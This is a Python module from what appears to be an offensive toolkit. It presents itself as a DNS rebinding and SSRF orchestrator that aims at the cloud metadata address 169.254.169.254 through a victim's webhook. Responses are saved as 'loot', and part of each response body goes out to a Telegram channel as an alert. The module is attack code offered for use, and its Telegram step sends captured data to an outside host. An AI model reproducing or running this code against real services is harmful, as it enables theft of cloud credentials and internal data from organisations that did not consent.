# ============================================================
# MODULE 3: modules/dns_rebinding.py
# ============================================================
"""
DNS_REBINDING.PY — DNS Rebinding & SSRF Callback Orchestrator v8.0
Features:
- Orchestrates rapid-TTL DNS switching to bypass IP allowlists on webhooks
- SSRF callback listener integration for internal metadata discovery
- Live persistence and Telegram telemetry alerting
"""
import time
import asyncio
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

class DNSRebindingOrchestrator:
    def __init__(self, target_webhook_url, internal_ip="169.254.169.254"):
        self.target_webhook_url = target_webhook_url
        self.internal_ip = internal_ip

    async def execute_rebinding_attack(self, transport_client):
        findings = {"target": self.target_webhook_url, "injected_ip": self.internal_ip, "status": "executed"}
        stream_proof("DNS_REBINDING_TRIGGER", self.target_webhook_url, {}, f"Targeting internal IP {self.internal_ip}", findings)
        
        status, headers, body = transport_client.request("GET", self.target_webhook_url)
        if status in (200, 302):
            save_session_loot(self.target_webhook_url, "dns_rebinding", "SSRF_METADATA_DISCOVERY", status, headers, body, findings)
            try:
                await send_telegram_alert("DNS Rebinding / SSRF Metadata Success", {"url": self.target_webhook_url, "response": body[:300]})
            except Exception:
                pass
        return findings
